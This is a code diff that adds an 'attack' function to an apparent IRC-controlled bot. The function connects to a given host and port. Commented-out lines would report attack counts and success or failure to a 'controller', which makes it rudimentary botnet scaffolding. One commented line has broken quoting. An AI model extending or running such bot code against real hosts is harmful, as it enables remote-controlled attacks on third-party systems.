@@ -30,6 +30,18 @@ def parsemsg(s):
     command = args.pop(0)
     return prefix, command, args
 
+def attack(nick , host, port):
+    attack_socket = socket.socket()
+    attack_socket.connect((host, port))
+    try: 
+        #CREATE A 'GLOBAL' COUNTER, then uncomment the line below
+        #attack_socket.send(bytearray('ATTACK COUNTER: ' + str(COUNTER) + ' BOT NAME: ' + nick + '\n', 'utf-8'))
+        #s.send(bytearray('privmsg 'controller' : 'bot nickname: attack success', 'utf-8'))
+        print('return success to controller')
+    except:
+        print('return failure to controller')
+        #s.send(bytearray('privmsg 'controller' : bot nickname: attack failed', 'utf-8'))
+
 # returns random 5 char string
 def generate_nickname(length):
     return ''.join(random.choice(string.ascii_lowercase) for i in range(length))
